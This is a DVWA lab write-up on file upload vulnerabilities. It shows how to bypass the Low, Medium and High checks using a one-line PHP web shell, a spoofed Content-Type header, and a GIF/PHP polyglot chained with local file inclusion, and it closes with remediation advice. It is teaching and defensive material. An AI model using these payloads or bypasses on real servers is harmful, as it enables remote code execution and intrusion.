## DVWA File Upload Writeup
**Difficulty Levels Covered:** Low | Medium | High
**Vulnerability Class:** CWE-434 — Unrestricted Upload of File with Dangerous Type
**Tools Used:** Browser, Burp Suite Repeater, PHP web shell payload

### What is a File Upload Vulnerability?

A file upload vulnerability exists when an application lets users upload files but fails to properly restrict what those files actually are — by type, content, or destination. If an attacker can get executable code (like a `.php` file) into a location the web server will run, an uploaded "image" or "document" becomes a foothold: a web shell that executes arbitrary commands on the server.

The DVWA File Upload module simulates a simple avatar/file uploader. Each difficulty level adds a different kind of check, and each one has a well-known bypass, because upload validation is only as strong as the specific thing it inspects.

The payloads used below are the ones from my own lab folder:

- `shell.php` / `file3.php` — a minimal PHP web shell: `<?php system($_GET['cmd']); ?>`
- `file.png`, `shell.png`, `file3.png`, `fileheck.png` — GIF/PHP polyglots: a valid `GIF89a` header followed by the same PHP payload, saved with a `.png`/image-looking name
- `file3.txt` — a harmless control file (`<h1>hello</h1>`) used to confirm what the app does with a clearly non-image file

---

### Low Security

**What the Code Does Wrong**

The Low level performs **no validation at all**. The uploaded file is moved to the uploads directory using whatever filename and extension it was given, with no extension check, no MIME-type check, and no content inspection.

```php
$target_path = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/' . basename($_FILES['uploaded']['name']);
move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path);
```

**Exploitation**

Step 1 — Upload the raw PHP payload

Using the plain web shell:

```php
<?php system($_GET['cmd']); ?>
```

saved as `shell.php`, upload it directly through the form. Since there's no filtering, it's accepted and stored as-is at:

```
/hackable/uploads/shell.php
```

Step 2 — Trigger execution

Browse to the uploaded file and pass a command via the `cmd` parameter:

```
http://localhost/hackable/uploads/shell.php?cmd=whoami
```

The server executes the PHP, which in turn runs the shell command, and the output is printed directly on the page.

**Result:** Full remote code execution — no bypass technique needed at all, since nothing is being checked.

**Why Low Was Exploitable**

The application places complete trust in the client. There is no server-side check of extension, content-type, or file contents before the file is written to a web-accessible, PHP-executing directory.

---

### Medium Security

**What Changed**

Medium adds two checks, both performed on values the *client* supplies in the request rather than anything inherent to the file:

```php
if (($_FILES['uploaded']['type'] == 'image/jpeg' || $_FILES['uploaded']['type'] == 'image/png')
    && ($_FILES['uploaded']['size'] < 100000)) {
    // allow upload
}
```

- **Content-Type check** — the browser-sent `Content-Type` header must read `image/jpeg` or `image/png`
- **Size check** — the file must be under 100,000 bytes

Crucially, `$_FILES['uploaded']['type']` is populated from the `Content-Type` field the browser puts in the multipart request — it is **not** derived from the actual file content. The server never opens the file to check what it really is.

**Exploitation**

Step 1 — Attempt a plain upload

Uploading `shell.php` as-is is rejected, since its `Content-Type` will be `application/x-php` or similar and its extension gives it away by name inspection during the request build.

Step 2 — Intercept and modify the request

Send the upload request to Burp Suite Repeater and edit the multipart body directly:

- Keep the filename as `shell.php` (the extension isn't checked here — only the header)
- Change the `Content-Type` field for that part from whatever it was to:

```
Content-Type: image/png
```

Since the size of `shell.php` (a one-line payload) is trivially under the 100,000-byte limit, both checks now pass and the file is written to disk with its original `.php` extension intact.

Step 3 — Trigger execution

Exactly as in Low:

```
http://localhost/hackable/uploads/shell.php?cmd=id
```

**Result:** The web shell executes — the "validation" only ever checked a header the attacker controls, not the file itself.

**Why Medium Was Still Exploitable**

Client-supplied metadata (`Content-Type`, original filename fields, etc.) is not a trustworthy signal of what a file actually is. Any check based on request headers rather than the file's real bytes can be trivially spoofed with an intercepting proxy.

---

### High Security

**What Changed**

High checks the file **extension** (must end in `.jpg`, `.jpeg`, `.png`, or `.gif`) and additionally calls `getimagesize()` on the uploaded file to confirm it is a structurally valid image:

```php
$uploaded_ext = strtolower(substr($uploaded_name, strrpos($uploaded_name, '.') + 1));

if (($uploaded_ext == 'jpg' || $uploaded_ext == 'jpeg' || $uploaded_ext == 'png' || $uploaded_ext == 'gif')
    && $uploaded_size < 100000) {
    if (getimagesize($uploaded_tmp)) {
        // allow upload
    }
}
```

`getimagesize()` doesn't fully decode the image — it just reads the leading bytes of the file to confirm they match a recognised image format signature (magic bytes) and returns dimensions. This is a real content check, but a shallow one: it only ever looks at the header, not the rest of the file.

**Exploitation — GIF/PHP Polyglot**

This is exactly what the `file.png` / `shell.png` / `file3.png` / `fileheck.png` payloads in my lab folder are built for. Each one is constructed as:

```
GIF89a;
<?php system($_GET['cmd']); ?>
```

`file` confirms the format: these are correctly reported as valid `GIF image data` because the first bytes are a legitimate `GIF89a` header. `getimagesize()` reads that header, sees a valid signature, and passes the file — it never inspects or cares about anything appended after it. The PHP payload sitting after the header is completely invisible to the check.

Step 1 — Confirm the polyglot is treated as a real image

`file3.txt` (`<h1>hello</h1>`) was used first as a control: uploading it with a `.txt` extension is rejected outright by the extension check, and renaming it to `.png` still fails `getimagesize()` because its content has no valid image header at all — confirming the check genuinely inspects file bytes, not just the name.

Step 2 — Upload the polyglot with an accepted extension

Upload `file.png` (extension `.png`, valid `GIF89a` header, PHP payload appended). Both the extension check and `getimagesize()` pass, since the file is a syntactically valid GIF as far as the header is concerned.

Step 3 — Get the file executed as PHP, not served as an image

This is the key extra step High requires versus Medium: the file is now sitting on disk as `file.png` — a real image, and PHP won't execute it as a script through the filename `.png`. Two common ways around this:

- If the server has a **secondary vulnerability** that lets you rename or move the file (e.g. a Local File Inclusion module, or a misconfigured Apache handler that executes `.png` as PHP via `AddType`/`AddHandler`), that's used to get it interpreted as PHP
- If DVWA/Apache is configured to hand `.php` extensions to the PHP interpreter regardless of double extensions or configuration quirks, uploading as `fileheck.php.png` or similar can sometimes still be picked up depending on server config

In a standard DVWA setup, this step is normally chained with the **File Inclusion** module: the polyglot is uploaded as an "image," then included via a vulnerable `page=` parameter, e.g.:

```
http://localhost/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/file.png&cmd=id
```

`include()` doesn't care about the `.png` extension — it just reads and executes any PHP tags found inside the included file, so the payload embedded after the GIF header runs.

**Result:** Code execution achieved by combining a magic-byte bypass (defeats `getimagesize()`) with a second vector (LFI) that gets the resulting file parsed as PHP despite its image extension.

**Why High Was Still Exploitable**

`getimagesize()` validates that a file *starts* with a recognisable image signature — it says nothing about what else the file contains. Appending PHP after a valid header produces a file that is simultaneously a legitimate image and a legitimate PHP script, depending on which program reads it. The extension check on its own is also purely cosmetic once something else on the server (an include, a misconfigured handler) is willing to execute a `.png` file as code.

---

### How to Actually Fix This

```php
// Re-encode uploaded images instead of trusting the original bytes
$image = imagecreatefromstring(file_get_contents($uploaded_tmp));
if ($image === false) {
    die('Invalid image');
}
imagepng($image, $destination); // strips anything beyond valid image data

// Store uploads outside the web root, or in a directory with script execution disabled
// e.g. via .htaccess: php_flag engine off  (in the uploads directory only)

// Serve uploaded files through a script that sets Content-Type explicitly,
// never let the webserver execute files from the upload directory directly
```

A complete defence includes:

- **Re-process, don't just validate** — decode the upload with an image library and re-encode it; a polyglot's appended payload doesn't survive re-encoding because the library only writes out genuine pixel data
- **Disable script execution in the upload directory** — even if a PHP file lands there, the server should never be configured to run it
- **Store uploads outside the web root** and serve them through a controlled download script, not direct URLs
- **Randomise stored filenames** and strip/ignore the client-supplied name and extension entirely
- **Validate content-type server-side from the actual bytes** (e.g. `finfo_file()`), never from the client-sent header
- **Principle of least privilege** on the web server process, so even a successfully executed shell has minimal reach

### Key Takeaway

Each DVWA level checks a different signal — filename, `Content-Type` header, magic bytes — and each signal can be satisfied without the file actually being safe. A polyglot file is the clearest illustration of this: it's not "hiding" from the check, it genuinely *is* a valid GIF, which is exactly what `getimagesize()` was asked to confirm. Real protection has to stop trusting the upload as a passive artifact to be classified, and instead actively strip it down to only the data format it claims to be (re-encoding), while making sure the destination can never execute code regardless of what slips through.

---
*Part of the [DVWA Writeup Series](../README.md)*  
*Previous: [Command Injection](../command-injection.md)*
